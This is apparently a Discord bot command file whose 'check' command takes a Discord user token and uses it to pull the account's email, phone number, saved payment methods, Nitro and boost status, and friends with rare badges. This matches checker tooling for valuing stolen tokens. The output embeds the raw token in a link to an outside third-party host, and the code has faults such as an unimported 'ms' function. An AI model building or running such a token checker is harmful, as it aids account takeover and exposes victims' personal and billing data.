const { PermissionFlagsBits, Client, EmbedBuilder, ApplicationCommandType, ApplicationCommandOptionType } = require("discord.js");
const config = require('./../../../settings/config.js');
const axios = require('axios');

module.exports = {
    name: "check",
    description: `check command of @vypbot`,
    userPermissions: PermissionFlagsBits.SendMessages,
    botPermissions: PermissionFlagsBits.SendMessages,
    category: "customer",
    type: ApplicationCommandType.ChatInput,

    options: [
        {
            name: 'token',
            description: 'You must enter a token!',
            type: ApplicationCommandOptionType.String,
            required: true
        }
    ],
    /**
     
     * @param {Client} client
     * @param {CommandInteraction} inter
     */
    run: async (client, inter) => {

        const token = inter.options.get('token').value;

        if (!token) {
            return inter.reply({ content: "Please provide a token!", ephemeral: true });
        }

        let json;
        await axios.get("https://discord.com/api/v9/users/@me", {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        }).then(res => { json = res.data })
            .catch(() => { })
        if (!json) return inter.reply({ content: 'Invalid token!', ephemeral: true });

        let info3;
        await axios.get('https://discord.com/api/v9/users/@me/billing/payment-sources', {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        }).then(res => { info3 = res.data })
            .catch(() => { })
        if (!info3) return inter.reply({ content: 'Error!', ephemeral: true });

        let info4;
        await axios.get('https://discord.com/api/v9/users/@me/relationships', {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        }).then(res => { info4 = res.data })
            .catch(() => { })
        if (!info4) return inter.reply({ content: 'Error!', ephemeral: true });

        let avatar_url = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}${json.premium_type == 0 ? '.png' : '.gif'}`

        var params = {
            content: "",
            embeds: [{
                "color": config.embed.color,
                "fields": [
                    {
                        name: "Token:",
                        value: `\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
                        inline: false
                    },
                    {
                        name: "Badges:",
                        value: GetBadges(json.flags),
                        inline: true
                    },
                    {
                        name: "Nitro Type:",
                        value: await GetNitro(json.premium_type, json.id, token),
                        inline: true
                    },
                    {
                        name: "Billing:",
                        value: GetBilling(info3),
                        inline: true
                    },
                    {
                        name: "Email:",
                        value: `\`${json.email}\``,
                        inline: true
                    },
                    {
                        name: "Phone:",
                        value: `\`${json.phone}\``,
                        inline: true
                    }
                ],
                "author": {
                    "name": `${json.username}#${json.discriminator} (${json.id})`,
                    "icon_url": config.embed.author.icon_url
                },
                "footer": {
                    "text": config.embed.footer,
                },
                "thumbnail": {
                    "url": avatar_url
                }
            }]
        }
        var hqFriendsEmbed = {
            "color": config.embed.color,
            "description": HqFriends(info4),
            "author": {
                "name": "HQ Friends",
                "icon_url": config.embed.author.icon_url
            },
            "footer": {
                "text": config.embed.footer,
            }
        }
        params.embeds.push(hqFriendsEmbed)
        return inter.reply({ embeds: params.embeds, ephemeral: true })

        function GetRBadges(flags) {
            const Discord_Employee = 1;
            const Partnered_Server_Owner = 2;
            const HypeSquad_Events = 4;
            const Bug_Hunter_Level_1 = 8;
            const Early_Supporter = 512;
            const Bug_Hunter_Level_2 = 16384;
            const Early_Verified_Bot_Developer = 131072;
            var badges = "";
            if ((flags & Discord_Employee) == Discord_Employee) {
                badges += "<:staff:874750808728666152> "
            }
            if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
                badges += "<:partner:874750808678354964> "
            }
            if ((flags & HypeSquad_Events) == HypeSquad_Events) {
                badges += "<:hypesquad_events:874750808594477056> "
            }
            if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
                badges += "<:bughunter_1:874750808426692658> "
            }
            if ((flags & Early_Supporter) == Early_Supporter) {
                badges += "<:early_supporter:874750808414113823> "
            }
            if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
                badges += "<:bughunter_2:874750808430874664> "
            }
            if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
                badges += "<:developer:874750808472825986> "
            }
            if (badges == "") {
                badges = ""
            }
            return badges
        }

        function GetBadges(flags) {
            const Discord_Employee = 1;
            const Partnered_Server_Owner = 2;
            const HypeSquad_Events = 4;
            const Bug_Hunter_Level_1 = 8;
            const House_Bravery = 64;
            const House_Brilliance = 128;
            const House_Balance = 256;
            const Early_Supporter = 512;
            const Bug_Hunter_Level_2 = 16384;
            const Early_Verified_Bot_Developer = 131072;
            var badges = "";
            if ((flags & Discord_Employee) == Discord_Employee) {
                badges += "<:staff:874750808728666152> "
            }
            if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
                badges += "<:partner:874750808678354964> "
            }
            if ((flags & HypeSquad_Events) == HypeSquad_Events) {
                badges += "<:hypesquad_events:874750808594477056> "
            }
            if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
                badges += "<:bughunter_1:874750808426692658> "
            }
            if ((flags & House_Bravery) == House_Bravery) {
                badges += "<:bravery:874750808388952075> "
            }
            if ((flags & House_Brilliance) == House_Brilliance) {
                badges += "<:brilliance:874750808338608199> "
            }
            if ((flags & House_Balance) == House_Balance) {
                badges += "<:balance:874750808267292683> "
            }
            if ((flags & Early_Supporter) == Early_Supporter) {
                badges += "<:early_supporter:874750808414113823> "
            }
            if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
                badges += "<:bughunter_2:874750808430874664> "
            }
            if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
                badges += "<:developer:874750808472825986> "
            }
            if (badges == "") {
                badges = "\`❌\`"
            }
            return badges
        }

        async function GetNitro(flags, id, token) {
            if (flags == 0) {
                return "\`❌\`"
            }
            if (flags == 1) {
                return "<:classic:896119171019067423>"
            }
            if (flags == 2) {
                let info;
                await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                    headers: {
                        "Content-Type": "application/json",
                        "authorization": token
                    }
                }).then(res => { info = res.data })
                    .catch(() => { })
                if (!info) return inter.reply({ content: 'Une erreur est apparue !', ephemeral: true });

                let boost = ["`1 month`", "`2 months`", "`3 months`", "`6 months`", "`9 months`", "`12 months`", "`15 months`", "`18 months`", "`24 months`"]
                var i = 0

                try {
                    let d = new Date(info.premium_guild_since)
                    let boost2month = parseInt(ms(new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())).replace('d', ''))
                    let d1 = new Date(info.premium_guild_since)
                    let boost3month = parseInt(ms(new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())).replace('d', ''))
                    let d2 = new Date(info.premium_guild_since)
                    let boost6month = parseInt(ms(new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())).replace('d', ''))
                    let d3 = new Date(info.premium_guild_since)
                    let boost9month = parseInt(ms(new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())).replace('d', ''))
                    let d4 = new Date(info.premium_guild_since)
                    let boost12month = parseInt(ms(new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())).replace('d', ''))
                    let d5 = new Date(info.premium_guild_since)
                    let boost15month = parseInt(ms(new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())).replace('d', ''))
                    let d6 = new Date(info.premium_guild_since)
                    let boost18month = parseInt(ms(new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())).replace('d', ''))
                    let d7 = new Date(info.premium_guild_since)
                    let boost24month = parseInt(ms(new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())).replace('d', ''))

                    if (boost2month > 0) {
                        i += 0
                    } else {
                        i += 1
                    } if (boost3month > 0) {
                        i += 0
                    } else {
                        i += 1
                    } if (boost6month > 0) {
                        i += 0
                    } else {
                        i += 1
                    } if (boost9month > 0) {
                        i += 0
                    } else {
                        i += 1
                    } if (boost12month > 0) {
                        i += 0
                    } else {
                        i += 1
                    } if (boost15month > 0) {
                        i += 0
                    } else {
                        i += 1
                    } if (boost18month > 0) {
                        i += 0
                    } else {
                        i += 1
                    } if (boost24month > 0) {
                        i += 0
                    } else if (boost24month < 0 || boost24month == 0) {
                        i += 1
                    } else {
                        i = 0
                    }
                } catch {
                    i += 0
                }
                return `<a:boost:824036778570416129> ${boost[i]}`
            } else {
                return "\`❌\`"
            }
        }

        function HqFriends(info4) {
            var f = info4
            const r = f.filter((user) => {
                return user.type == 1
            })
            var hqFriend = "";
            for (const z of r) {
                var b = GetRBadges(z.user.public_flags)
                if (b != "") {
                    hqFriend += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
                }
            }
            if (hqFriend == "") {
                hqFriend = "*Nothing to see here*"
            }
            return hqFriend
        }

        function GetBilling(info3) {
            const json = info3
            var billing = "";
            json.forEach(z => {
                if (z.type == "") {
                    return;
                } else if (z.type == 1 && z.invalid == false) {
                    billing += "\` :credit_card\`"
                } else if (z.type == 2 && z.invalid == false) {
                    billing += "\`  <:paypal:896441236062347374\`"
                } else {
                    return;
                }
            })
            if (billing == "") {
                billing = "\`❌\`"
            }
            return billing
        }
    },
};